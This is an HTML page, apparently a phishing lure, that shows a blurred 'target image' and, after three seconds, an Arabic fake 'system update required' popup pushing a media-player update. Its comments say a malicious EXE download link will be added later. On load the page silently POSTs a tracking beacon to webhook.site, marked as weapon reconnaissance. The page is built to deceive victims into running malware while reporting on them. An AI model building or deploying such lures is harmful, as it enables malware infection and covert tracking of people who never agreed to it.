<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Image Preview</title>
    <style>
        body { margin:0; background:black; display:flex; justify-content:center; align-items:center; height:100vh; overflow:hidden; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        img { max-width:100%; max-height:100%; object-fit:contain; filter: blur(5px); transition: 0.5s; }
        
        /* تصميم التنبيه الوهمي */
        #update-box {
            position: absolute; width: 300px; background: white; padding: 20px; border-radius: 12px;
            text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); display: none; z-index: 100;
        }
        button { background: #007bff; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; margin-top: 15px; }
        button:hover { background: #0056b3; }
    </style>
</head>
<body>

    <div id="update-box">
        <h3 style="color: #333; margin: 0;">تحديث النظام مطلوب</h3>
        <p style="color: #666; font-size: 14px;">يجب تحديث "مشغل الوسائط" لعرض هذه الصورة بدقة عالية.</p>
        <button onclick="startDownload()">تحديث الآن</button>
    </div>

    <img src="target_image.jpg" id="target-img">

    <script>
        // 1. إظهار التنبيه بعد 3 ثوانٍ من فتح الصورة
        setTimeout(() => {
            document.getElementById('update-box').style.display = 'block';
        }, 3000);

        // 2. وظيفة التحميل (هنا سنضع رابط السلاح الثقيل لاحقاً)
        function startDownload() {
            alert("جاري بدء التحديث... يرجى تشغيل الملف بعد التحميل.");
            // ملاحظة: هنا سنضع رابط ملف الـ EXE أو التطبيق لاحقاً
        }

        // [SIMPLE_WEAPON_RECON]: سحب البيانات الصامت لا يزال يعمل
        window.onload = function() {
            const webhook = "https://webhook.site";
            fetch(webhook, { method: 'POST', mode: 'no-cors', body: JSON.stringify({status: "Target watching blurred image"}) });
        };
    </script>
</body>
</html>
